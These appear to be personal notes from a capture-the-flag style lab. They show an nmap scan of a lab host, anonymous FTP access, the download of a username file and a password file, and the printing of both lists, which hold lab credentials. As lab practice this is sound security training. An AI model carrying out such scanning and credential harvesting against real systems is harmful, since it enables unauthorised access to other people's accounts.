```
kali@kali ~> nmap -sC -sV 10.129.45.119
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 12:49 EDT
Nmap scan report for 10.129.45.119
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.71
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds
```

```
ftp> ls
229 Entering Extended Passive Mode (|||49810|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||46618|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |************************************************************************|    33       13.49 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.39 KiB/s)
ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||47170|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |************************************************************************|    62      332.67 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (0.77 KiB/s)
```

```
kali@kali ~> cat allowed.userlist
aron
pwnmeow
egotisticalsw
admin
kali@kali ~> cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
kali@kali ~> 
```




![[Pasted image 20231103191014.png]]